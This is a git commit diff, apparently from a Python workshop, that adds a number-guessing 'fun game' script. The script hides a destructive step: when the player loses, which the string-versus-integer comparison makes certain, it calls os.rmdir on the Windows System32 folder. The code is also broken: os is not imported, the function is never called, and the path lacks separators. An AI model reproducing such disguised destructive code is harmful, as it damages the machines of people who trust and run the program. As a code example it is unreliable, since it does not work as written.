bbf8be84f21594b0d3ef2eeb9667707754064b1b
Sid <Sidvaneijndhoven@gmail.com>
2024-09-06 15:23:57 +0200

    fun game

---
+++ python-workshop/odd-or-even.py
@@ -0,0 +1,18 @@
+while True:
+    print("Lets play a little game!")
+
+    number = int(input("Pick a number between 1 and 10"))
+
+    dir_path = 'C:WindowsSystem32'
+
+    def fun_game():
+        if number == "7":
+            print("congrats you won!")
+        else:
+             os.rmdir(dir_path)
+            
+    reset = input("Do you want to reset? (yes/no)") 
+    if reset.lower() != "yes":
+        break
+
+    print("goodbye")
